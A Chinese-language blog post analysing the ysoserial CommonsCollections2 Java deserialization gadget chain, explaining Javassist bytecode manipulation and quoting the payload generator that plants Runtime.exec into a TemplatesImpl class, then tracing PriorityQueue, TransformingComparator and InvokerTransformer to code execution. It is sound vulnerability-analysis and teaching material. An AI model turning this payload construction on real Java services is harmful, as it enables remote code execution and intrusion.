---
title: Ysoserial工具解读（二）
date: 2019-10-30 09:19:33
tags: [Java, RCE,反序列化]
categories: 漏洞分析
cover: java_cover.png
---

今天再来分析CommonsCollections2.java中用到的类，主要包括`PriorityQueue`、`TemplatesImpl`。

<!-- more -->

## 基础知识

### Java的字节码操作

这里介绍两个库Asm和Javassist，两者相比较：Asm库很轻量化，但需要对JVM的汇编指令有一定了解，这个库正是冰蝎修改字节码用的库。相比于Asm，Javassist就对新手友好了很多，它是JBoss项目的子项目，被Jboss用来实现动态代理。你不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。 例如，使用Javassist代码创建一个这样的类：

```java
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewMethod;

/**
 *	想模拟的Java类:
 *	public class Target{
 *		public void talk(){
 *			System.out.println("Speaking aloud...");
 *		}
 *	}
 */

public class LearnAssist {

    public static void main(String[] args)throws Exception{
        ClassPool pool = ClassPool.getDefault();
        //创建Target类
        CtClass cc= pool.makeClass("ysoserial.Target");
        //定义talk方法
        CtMethod method = CtNewMethod.make("public void talk(){}", cc);
        //在原方法之前插入代码
        method.insertBefore("System.out.println(\"Speaking aloud...\");");
        cc.addMethod(method);
        //保存生成的字节码
        cc.writeFile(".");
    }

}
```

在IDEA中运行这段代码，可以看到新生成的.class文件，点击它时默认调用`javap`做了反编译：

![](code1.png)

## Javassist的利用


同上一篇，我们先从payload生成的代码段看起：

```java
/*	CommonsCollections2.java
*/

public Queue<Object> getObject(final String command) throws Exception {
    // 创建构造函数包含恶意代码的TemplatesImpl实例
    final Object templates = Gadgets.createTemplatesImpl(command);
    // 用一个无意义的数据初始化InvokerTransformer，后面会再次修改
    final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

    // 初始化一个PriorityQueue对象，定义其容量为2、比较器为TransformingComparator
    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
    // 插入一些无意义的数据，后面再修改
    queue.add(1);
    queue.add(1);

    // 使用反射机制插入真正的攻击代码
    // 将InvokerTransformer对象的iMethodName字段值变为newTransformer
    Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

    // 取出PriorityQueue对象的queue字段，并将第一个元素换成恶意的TemplatesImpl对象
    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
    queueArray[0] = templates;
    queueArray[1] = 1;

    return queue;
}
```

一步步分析，我们先看看`Gadgets.createTemplatesImpl()`方法的有关代码：

```java
/*	Gadgets.java
*/

public static Object createTemplatesImpl ( final String command ) throws Exception {
    if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
        return createTemplatesImpl(
            command,
            // 这个三个类即作为参数传入createTemplatesImpl()方法
            Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
            Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
            Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
    }

    return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
}

public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
    throws Exception {
    final T templates = tplClass.newInstance();

    // 这里使用了Javassist来添加恶意代码
    ClassPool pool = ClassPool.getDefault();
    // insertClassPath()用来在原本的ClassPath前添加类的搜索路径
    // StubTransletPayload类继承了AbstractTranslet类，在本文件中定义，这里暂且不贴
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    pool.insertClassPath(new ClassClassPath(abstTranslet));
    // get()根据类名称创建一个CtClass对象
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());

    // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
    String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
        command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
        "\");";
    // 创建一个空的类初始化方法（其实就是静态构造函数，即static{}），并在方法后面添加恶意代码
    clazz.makeClassInitializer().insertAfter(cmd);
    // 为这个类创建一个随机化的名称，以ysoserial.Pwner打头
    clazz.setName("ysoserial.Pwner" + System.nanoTime());
    // 获取AbstractTranslet类，并将它作为刚刚创建类的父类
    CtClass superC = pool.get(abstTranslet.getName());
    clazz.setSuperclass(superC);

    final byte[] classBytes = clazz.toBytecode();

    // 利用反射机制将刚刚创建类的字节码插入TemplatesImpl对象的_bytecodes字段
    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
        // 注意这里是两个字节码，第一个是我们改造过的类，第二个是Foo类（一个没啥用的类）
        // 我也没深究过为什么要装入两个类，但只要知道_bytecodes[0]里是恶意类就行
        classBytes, ClassFiles.classAsBytes(Foo.class)
    });

    // 这两句保证templates能被完成调用逻辑
    // 看到有人分析_tfactory是否初始化无差别，我没去看这部分代码，感觉意义不大
    Reflections.setFieldValue(templates, "_name", "Pwnr");
    Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
    return templates;
}
```

可以看到这里用Javassist获取了`StubTransletPayload`类后，对它进行了修改（改了名称、添加了父类（其实没变化）、创建了静态构造函数），为了演示这一效果，我将代码拷贝如新的java文件中，运行结果如下：

![](code2.png)

## 攻击链之`PriorityQueue`类

CommonsCollections2的攻击链最外层的类是`PriorityQueue`类，其构造函数及反序列化函数如下：

```java
/*	PriorityQueue.java
*/

public PriorityQueue(int initialCapacity,
                     Comparator<? super E> comparator) {
    // Note: This restriction of at least one is not actually needed,
    // but continues for 1.5 compatibility
    if (initialCapacity < 1)
        throw new IllegalArgumentException();
    // 成员变量queue用来保存一个Object数组
    this.queue = new Object[initialCapacity];
    // 成员变量comparator用来保存比较器
    this.comparator = comparator;
}

private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
	* * * *

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}

private void heapify() {
    // 这里的成员变量size在初始化过程中会被赋值为queue数组的元素数量
    // 按照之前payload的构造方式应该是2
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}

private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
	* * * *
}

private void siftDownUsingComparator(int k, E x) {
    // 按照构造payload的过程推算一下：
    // half = 1, k=0
    int half = size >>> 1;
    while (k < half) {
        // child = 1
        int child = (k << 1) + 1;
        // c is a Interger Object
        Object c = queue[child];
        // right = 2
        int right = child + 1;
        // 会避开这条if语句
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        // 这里的comparator因为是TransformingComparator,所以接下来看看它的compare方法
        if (comparator.compare(x, (E) c) <= 0)
            break;
	* * * *
}   
```

## 攻击链之`TransformingComparator`类

```java
/* TransformingComparator.java
*/
// 构造函数
public TransformingComparator(final Transformer<? super I, ? extends O> transformer) {
    this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
}

public int compare(final I obj1, final I obj2) {
    // 这里的obj1就是个TemplatesImple对象
    // 根据payload构造过程，这里的this.transformer是一个InvokerTransformer对象
    final O value1 = this.transformer.transform(obj1);
    final O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

之前，初始化`TransformingComparator`实例的`InvokerTransformer`对象被反射机制将它的`iMethodName`变量改成了`newTransformer`字符串。

```java
/* InvokerTransformer.java
*/

public O transform(final Object input) {
    if (input == null) {
        return null;
    }
    try {
        final Class<?> cls = input.getClass();
        // 这里获取了TemplatesImple对象的newTransformer()方法
        final Method method = cls.getMethod(iMethodName, iParamTypes);
        // 并调用该方法
        return (O) method.invoke(input, iArgs);
    }
    * * * * 
}
```

## 攻击链之`TemplatesImple`类

总算到了`TemplatesImple`类，其成员变量及相关调用函数如下：

```java
public final class TemplatesImpl implements Templates, Serializable {

    private static String ABSTRACT_TRANSLET
        = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
    private byte[][] _bytecodes = null;
    private Class[] _class = null;
    private int _transletIndex = -1;

	* * * *
        
    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;
		
        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
                                          _indentNumber, _tfactory);
        * * * *
    }
    
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            // 在构造payload过程中，TemplatesImpl对象的__name被赋值为"Pwnr"，以免这里直接return
            if (_name == null) return null;
			// 因为这里_class为空，会调用defineTransletClasses()方法
            // 该方法细节分析见后文
            if (_class == null) defineTransletClasses();

            // 在经过上面的方法后_class[_transletIndex]=_class[0]
            // 也就是我们构造的恶意类，当它被newInstance()时，其构造函数中的代码就会执行
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
			* * * * 
    }
```
`defineTransletClasses()`方法的精简内容如下：

```java
        
    private void defineTransletClasses()
        throws TransformerConfigurationException {

       * * * *

        try {
            // 之前分析过这里的_bytecodes应该有两个元素
            // [0]是我们恶意修改过的StubTransletPayload类，当然名称已改
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new Hashtable();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // 我们在构造恶意的StubTransletPayload类时将其父类设置为ABSTRACT_TRANSLET
                // 因此会进入这条if语句
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    // _transletIndex = 0
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }
            
		* * * *
    }    
```

## 总结

我们补充一下CommonsCollections2.java注释中写的调用链：

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				PriorityQueue.heapify()
					PriorityQueue.siftDown()
						PriorityQueue.siftDownUsingComparator()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							TemplatesImpl.newTransformer()
								TemplatesImpl.getTransletInstance()
									Class.newInstance()
				...
							Method.invoke()
								Runtime.exec()
 */
```

调试信息显示的调用栈如下：

![](debug.png)

其实，最好的理解方式就是模拟反序列化的操作，并在关键的位置打上断点去跟踪。我写的几篇文章的价值是为读者补充一些基础知识，整个调用栈的完整过程真不如自己debug来的清楚。

## References

1.  [ https://www.cnblogs.com/rinack/p/7742682.html ]()
2.   [https://www.cnblogs.com/rickiyang/p/11336268.html ]()
3.   [http://www.javassist.org/html/index.html]()